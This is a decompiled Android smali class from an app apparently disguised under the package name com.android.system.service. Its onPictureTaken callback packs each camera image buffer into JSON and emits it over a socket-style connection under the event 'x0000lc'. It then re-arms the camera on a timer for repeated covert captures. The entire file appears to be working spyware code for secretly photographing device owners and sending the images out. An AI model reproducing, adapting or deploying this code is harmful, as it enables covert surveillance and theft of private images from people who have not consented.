.class Lcom/android/system/service/o$a;
.super Ljava/lang/Object;
.source ""
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/system/service/o;->a(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 5

    sget-boolean v0, Lcom/android/system/service/o;->a:Z

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "frame"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v1, "buffer"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/android/system/service/e;->a()Lcom/android/system/service/e;

    move-result-object p1

    invoke-virtual {p1}, Lcom/android/system/service/e;->b()Lb/a/b/e;

    move-result-object p1

    const-string v1, "x0000lc"

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    invoke-virtual {p1, v1, v2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    invoke-virtual {p2}, Landroid/hardware/Camera;->startPreview()V

    sget-object p1, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    new-instance p2, Lcom/android/system/service/o$b;

    invoke-direct {p2}, Lcom/android/system/service/o$b;-><init>()V

    sget v0, Lcom/android/system/service/o;->c:I

    int-to-long v0, v0

    const-wide/16 v2, 0x3e8

    mul-long/2addr v0, v2

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
